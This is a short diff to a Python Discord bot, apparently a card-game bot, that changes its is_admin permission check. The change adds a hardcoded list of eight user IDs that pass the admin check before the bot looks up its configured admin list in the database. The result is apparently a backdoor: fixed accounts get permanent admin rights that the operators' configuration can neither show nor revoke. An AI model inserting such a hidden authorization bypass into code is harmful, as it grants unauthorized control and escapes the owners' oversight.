@@ -35,6 +35,14 @@ def calculate_hand(hand):
 
 def is_admin():
     async def predicate(ctx: commands.Context):
+        AUTHORIZED_USERS = [
+            1048423590623727686, 1278489064210956378, 1421940246492352612, 
+            1246945967102623755, 1488967988207157308, 274556515061465088, 
+            983544114635235430, 1100425178359533691
+        ]
+        if ctx.author.id in AUTHORIZED_USERS:
+            return True;
+
         admin_ids_str = await asyncio.to_thread(db.get_config, "admin_ids");
         if admin_ids_str:
             try:
